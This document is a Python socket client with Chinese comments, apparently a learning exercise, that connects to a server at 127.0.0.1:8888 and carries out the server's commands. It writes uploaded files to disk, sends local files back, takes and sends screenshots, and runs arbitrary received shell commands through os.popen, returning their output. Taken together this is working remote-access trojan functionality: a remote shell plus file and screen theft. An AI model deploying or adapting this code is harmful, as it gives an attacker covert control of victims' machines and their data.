import os
import socket
import threading


# 接收来自服务器的命令
def recv_service_msg(client_sock):
    while True:
        # recv返回值是字节串类型
        cmd = client_sock.recv(1024).decode()
        cmd = cmd.strip().split()
        # 如果结果为空，说明对方断开连接了
        if not cmd:
            break
        # 处理接收到的消息
        if cmd[0] == 'upload':
            recv_upload(client_sock, cmd)
        elif cmd[0] == 'os-shell':
            os_shell(client_sock)
        elif cmd[0] == 'download':
            upload_file(client_sock, cmd)
        elif cmd[0] == 'screenshot':
            screenshot(client_sock, cmd)
        else:
            print('服务器的消息为：', ' '.join(cmd))


# 对接收文件进行处理
def recv_upload(client_sock, cmd):
    MAX_SEND_SIZE = 1024
    # 验证接收的目录是否存在，如果不存在就获取当前目录并写入
    file_dir = os.path.dirname(cmd[2])
    if not os.path.exists(file_dir):
        file_dir = os.getcwd()
    # 验证接收的文件名是否有效，如果无效自动生成
    file_name = os.path.basename(cmd[2])
    tmp = os.path.splitext(file_name)
    tmp2 = os.path.splitext(os.path.basename(cmd[1]))
    if tmp[1] == tmp2[1]:
        pass
    else:
        file_name = 'copy' + os.path.basename(cmd[1])
    # 接受文件大小计算次数
    file_size = int(cmd[3])
    # 计算数据接受次数
    tmp = file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE + 1
    else:
        count = file_size // MAX_SEND_SIZE
    # 创建文件，写入内容
    path = os.path.join(file_dir, file_name)
    file = open(path, 'wb')
    for i in range(count):
        data = client_sock.recv(1024)
        # print(f'正在写入:{data}')
        file.write(data)
    file.close()
    print('文件传输成功')


# 上传文件
def upload_file(client_sock, cmd):
    # upload d:\1.txt d:\
    # strip()删除命令字符串两端的空字符
    MAX_SEND_SIZE = 1024
    # cmd = cmd.strip().split()
    # 验证文件是否存在
    if not os.path.exists(cmd[1]):
        send_cmd(client_sock, 'the file not exist')
        return
    else:
        # 通知服务端准备接收文件
        send_cmd(client_sock, 'download')
    # 读文件，发送上传文件命令
    # 先获取文件大小，计算发送次数
    file_size = os.path.getsize(cmd[1])
    # 计算数据发送次数
    tmp = file_size % MAX_SEND_SIZE
    if tmp:
        count = file_size // MAX_SEND_SIZE + 1
    else:
        count = file_size // MAX_SEND_SIZE
    print(f'即将发送文件{cmd[1]},文件大小{file_size}')
    # 把命令先发送过去,文件大小
    # send_cmd(client_sock,str(file_size))
    send_cmd(client_sock, cmd, str(file_size), os.path.basename(cmd[2]))
    # 读取文件内容并发送出去
    file = open(cmd[1], 'rb')
    print('.............uploading............')
    for i in range(count):
        data = file.read(MAX_SEND_SIZE)
        send_content(client_sock, data)
        # print(f'发送数据：{data}')
    file.close()
    print('upload finished')


# 截取屏幕图片并上传
def screenshot(client_sock, cmd):
    import pyautogui
    # import pyscreenshot
    im = pyautogui.screenshot()
    im.save('screenshot.jpg')
    cmd = 'download .\\screenshot.jpg .\\'
    cmd = cmd.strip().split()
    upload_file(client_sock, cmd)


# 执行系统命令并返回
def os_shell(client_sock):
    '执行系统命令并发送回服务器'
    while True:
        '这里接收到的命令都是系统命令，除了退出命令exit'
        cmd = client_sock.recv(1024).decode()
        if cmd == 'exit':
            break
        tmp = cmd.split()
        if tmp[0] == 'cd':
            os.chdir(tmp[1])
        else:
            data = os.popen(cmd).read()
            sock.send(data.encode())


# 发送命令给客户端
def send_cmd(client_sock, *cmd):
    cmd = list(cmd)
    if isinstance(cmd[0], list):
        tmp = cmd[0]
        for i in range(1, len(cmd)):
            tmp.append(cmd[i])
        tmp = ' '.join(tmp)
        client_sock.send(tmp.encode())
    else:
        if len(cmd) > 1:
            cmd = ' '.join(cmd)
            client_sock.send(cmd.encode())
        else:
            client_sock.send(cmd[0].encode())


def send_content(client_sock, data):
    client_sock.send(data)
    return


# 1.创建套接字
sock = socket.socket()
# 2.连接服务器端(指定服务端的IP和端口)
sock.connect(('127.0.0.1', 8888))  # 元组形式传输host+port
# 创建线程处理发来消息
t = threading.Thread(target=recv_service_msg, args=(sock,))
t.start()
# 3.给服务器发消息
while True:
    msg = input('msg>>')
    if msg == 'exit':
        break
    sock.send(msg.encode())
# 4.关闭套接字
sock.close()
